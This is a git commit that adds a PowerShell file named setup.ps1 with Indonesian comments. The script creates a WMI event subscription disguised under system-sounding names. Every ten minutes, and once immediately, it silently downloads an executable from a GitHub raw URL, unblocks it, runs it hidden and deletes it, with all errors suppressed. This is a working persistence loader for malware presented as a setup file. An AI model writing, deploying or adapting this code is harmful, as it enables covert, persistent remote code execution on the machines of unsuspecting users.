e158d13d13484a4a5e8b7483bc061fa94997d3a3
elmismedina0126 <elmismedina0126@gmail.com>
2026-09-07 21:05:28 -0500

    Add files via upload

---
+++ setup.ps1
@@ -0,0 +1,50 @@
+$ErrorActionPreference = "SilentlyContinue"
+
+# ===== Konfigurasi =====
+$url = 'https://raw.githubusercontent.com/elmismedina0126/blablawa/main/noobs.exe'
+$temp = 'C:\Windows\Temp\ldr.exe'
+$filterName = 'Microsoft-Windows-SystemSecurity'
+$consumerName = 'WindowsSystemMaintenance'
+$interval = 600   # 600 detik = 10 menit
+
+# ===== Hapus subscription lama jika ada =====
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
+    Where-Object { $_.Filter -like "*$filterName*" -or $_.Consumer -like "*$consumerName*" } |
+    Remove-WmiObject
+
+Get-WmiObject -Namespace root\subscription -Class __EventFilter |
+    Where-Object { $_.Name -eq $filterName } |
+    Remove-WmiObject
+
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
+    Where-Object { $_.Name -eq $consumerName } |
+    Remove-WmiObject
+
+# ===== Skrip download + execute + cleanup =====
+$downloadCommand = "try { iwr '$url' -OutFile '$temp' -UseBasicParsing; Unblock-File '$temp'; Start-Process '$temp' -WindowStyle Hidden -Wait; Remove-Item '$temp' -Force } catch {}"
+
+# Command untuk WMI consumer (bungkus dengan powershell -c)
+$consumerCommand = "powershell -NoP -WindowStyle Hidden -c `"$downloadCommand`""
+
+# ===== Buat event filter =====
+$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
+    Name = $filterName
+    EventNameSpace = "root\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN $interval WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+
+# ===== Buat consumer =====
+$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
+    Name = $consumerName
+    CommandLineTemplate = $consumerCommand
+}
+
+# ===== Binding filter dan consumer =====
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
+    Filter = $filter
+    Consumer = $consumer
+}
+
+# ===== Eksekusi langsung sebagai tes =====
+Invoke-Expression $downloadCommand
